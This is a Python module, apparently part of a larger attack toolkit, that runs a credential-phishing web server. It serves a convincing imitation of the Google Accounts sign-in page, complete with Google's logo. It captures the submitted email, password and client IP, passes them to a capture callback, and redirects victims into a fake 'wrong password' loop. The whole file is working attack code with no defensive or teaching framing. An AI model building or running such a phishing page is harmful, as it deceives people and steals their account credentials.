import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PHISH_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Sign in – Google Accounts</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px}
  .logo{text-align:center;margin-bottom:16px}
  .logo svg{width:75px}
  h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}
  .sub{text-align:center;font-size:16px;color:#202124;margin-bottom:32px}
  input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;margin-bottom:20px}
  input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
  .btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:13px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}
  .err{color:#d93025;font-size:13px;margin-bottom:12px}
  .forgot{color:#1a73e8;font-size:14px;cursor:pointer}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M29.77 12.18c0 3.3-2.58 5.73-5.74 5.73s-5.74-2.44-5.74-5.73 2.58-5.73 5.74-5.73 5.74 2.43 5.74 5.73zm-2.51 0c0-2.06-1.5-3.47-3.23-3.47s-3.23 1.41-3.23 3.47 1.5 3.47 3.23 3.47 3.23-1.41 3.23-3.47z" fill="#EA4335"/>
      <path d="M42.17 12.18c0 3.3-2.58 5.73-5.74 5.73s-5.74-2.44-5.74-5.73 2.58-5.73 5.74-5.73 5.74 2.43 5.74 5.73zm-2.51 0c0-2.06-1.5-3.47-3.23-3.47s-3.23 1.41-3.23 3.47 1.5 3.47 3.23 3.47 3.23-1.41 3.23-3.47z" fill="#FBBC05"/>
      <path d="M54.67 6.77v10.62c0 4.37-2.58 6.16-5.63 6.16-2.87 0-4.6-1.92-5.25-3.49l2.18-.91c.4.97 1.39 2.12 3.07 2.12 2.01 0 3.25-1.24 3.25-3.57v-.87h-.09c-.6.74-1.75 1.38-3.2 1.38-3.04 0-5.82-2.64-5.82-6.05 0-3.43 2.78-6.1 5.82-6.1 1.45 0 2.6.64 3.2 1.36h.09V6.77h2.38zm-2.2 5.44c0-2.02-1.35-3.5-3.07-3.5-1.74 0-3.2 1.48-3.2 3.5 0 2 1.46 3.45 3.2 3.45 1.72 0 3.07-1.45 3.07-3.45z" fill="#4285F4"/>
      <path d="M59 1.5v16.5h-2.5V1.5H59z" fill="#34A853"/>
      <path d="M68.93 14.14l1.95 1.3c-.63.93-2.14 2.47-4.76 2.47-3.24 0-5.66-2.51-5.66-5.73 0-3.41 2.44-5.73 5.38-5.73 2.96 0 4.41 2.37 4.88 3.65l.26.65-7.63 3.16c.58 1.15 1.49 1.73 2.77 1.73 1.28 0 2.17-.63 2.81-1.5zm-5.98-2.06l5.1-2.12c-.28-.71-1.12-1.2-2.12-1.2-1.27 0-3.04 1.12-2.98 3.32z" fill="#EA4335"/>
      <path d="M9.37 10.9V8.64h7.95c.08.41.12.9.12 1.42 0 1.77-.48 3.96-2.04 5.52-1.52 1.58-3.46 2.42-6.03 2.42C4.2 18 0 13.95 0 8.82S4.2-.37 9.37-.37c2.64 0 4.52 1.04 5.93 2.38l-1.67 1.67C12.57 2.66 11.12 2 9.37 2 5.62 2 2.68 5.04 2.68 8.82s2.94 6.82 6.69 6.82c2.43 0 3.82-.98 4.71-1.87.72-.72 1.2-1.75 1.38-3.17l-6.09.3z" fill="#4285F4"/>
    </svg>
  </div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form method="POST" action="/">
    <input name="email" type="email" placeholder="Email or phone" autocomplete="off" required>
    <input name="password" type="password" placeholder="Enter your password" autocomplete="off" required>
    <button class="btn" type="submit">Next</button>
  </form>
</div>
</body>
</html>"""


class _Handler(BaseHTTPRequestHandler):
    bus = None

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PHISH_HTML.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        params = parse_qs(body)
        creds = {k: v[0] for k, v in params.items()}
        if self.bus:
            self.bus.on_phish_capture(creds, self.client_address[0])
        # Redirect back (victim sees a "wrong password" loop)
        self.send_response(302)
        self.send_header("Location", "/")
        self.end_headers()

    def log_message(self, *args):
        pass


class PhishServer:
    def __init__(self, bus):
        self.bus = bus
        self._server = None
        self._thread = None
        self.active = False
        self.port = 80

    def start(self, port: int = 80):
        if self.active:
            return
        self.port = port
        _Handler.bus = self.bus
        self._server = HTTPServer(("0.0.0.0", port), _Handler)
        self.active = True
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def stop(self):
        if self._server:
            self._server.shutdown()
        self.active = False
